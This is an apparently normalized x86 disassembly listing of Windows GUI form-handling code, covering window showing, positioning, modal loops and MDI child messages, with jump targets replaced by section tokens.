mov [ ebx ] esi
sub_458c8c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441ca4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_456c9c
lea edx [ ebp - 0x14 ]
call sub_45a464
push ebp
mov eax [ ebp - 0x4 ]
call sub_456c9c
lea edx [ ebp - 0x24 ]
call sub_45a464
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_458c60
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_456c9c
lea edx [ ebp - 0x24 ]
call sub_45a464
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_458c60
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_458c60
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_458c60
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_458d44
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403454
pop esi
pop ebx
retn
sub_458d68
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403454
pop esi
pop ebx
retn
sub_458d8c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_442b84
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_443c3c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_443c3c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_458e28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_459392
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_45d53c
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_459375
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45937c
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
xor eax eax
push ebp
push sub_45927c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_458ee0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_457fd4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440c60
jmp r-xdata
mov eax [ rw-data ]
call sub_45a6c0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43c924
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_443708
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_45a6b4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43c968
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_443708
call sub_453c38
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45a6f0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43c924
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45a6c0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43d180
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45a6e4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43c968
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45a6b4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_457284
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_457284
jmp r-xdata
sub_458ee5
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45cc50
call sub_403a60
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_45a6c0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43c924
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45a6b4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43c968
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45a6f0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43c924
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45a6c0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45937c
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43d180
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45a6e4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43c968
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45a6b4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_457284
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_457284
jmp r-xdata
sub_459281
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45cc50
call sub_403a60
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_457fd4
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440c60
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_443708
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45937c
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_443708
call sub_453c38
mov ebx eax
sub_4593c8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_459420
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc44
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45947e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403258
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_45948c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403454
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4594b8
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45cc3c
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403454
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_459658
jmp r-xdata
mov eax ebx
call sub_4596f4
mov dl 0x1
mov eax ebx
call sub_457244
jmp r-xdata
sub_45955c
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_456bd0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_456c1c
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_4595c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45962c
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403454
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4596f4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459678
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4596e6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4596ed
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_457ed0
sub_459710
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4599d8
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43b780
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_45bbb0
xor edx edx
push ebp
push sub_4599bb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_413fc0
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_45abe0
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_453ae8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_459999
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_459660
xor edx edx
push ebp
push sub_4598f8
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4595c0
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45c9bc
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_443708
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4598ff
mov eax [ ebp - 0x4 ]
call sub_459658
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_4598ff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4599a3
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45abe0
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_45abe0
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_413f3c
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_414088
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_453b9c
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4599e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_440438
mov esi eax
